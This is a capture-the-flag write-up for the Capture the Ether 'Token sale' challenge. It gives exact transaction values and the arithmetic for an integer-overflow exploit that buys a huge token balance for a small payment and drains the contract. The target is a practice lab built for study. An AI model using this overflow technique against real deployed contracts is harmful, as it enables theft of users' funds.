# Token sale
https://capturetheether.com/challenges/math/token-sale/


1. Call the function "buy" with the argument (115792089237316195423570985008687907853269984665640564039458) and msg.value == 415992086870360064 wei (!).*
2. Call the function "sell" with the argument (1).
3. Contract balance will be 0.415992086870360064 Ether but that's enough to complete the challenge.
!You may repeat step №1 four more times and repeat step №2 with argument (2) to make contract balance 0.07996043435180032 Ether.

*Сalculations:

numTokens - ?
msg.value - ?

uint256 constant PRICE_PER_TOKEN = 1 ether;

function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
}

uint256 max value = 115792089237316195423570985008687907853269984665640564039457584007913129639935
1 ether == 1000000000000000000 wei (10^18)

msg.value == numTokens * PRICE_PER_TOKEN

to cause overflow:
numTokens = (uint256 max value)/10^18 + 1
numTokens = 115792089237316195423570985008687907853269984665640564039458

msg.value = numTokens * 10^18 - (uint256 max value) - 1 
msg.value = 415992086870360064 wei (!)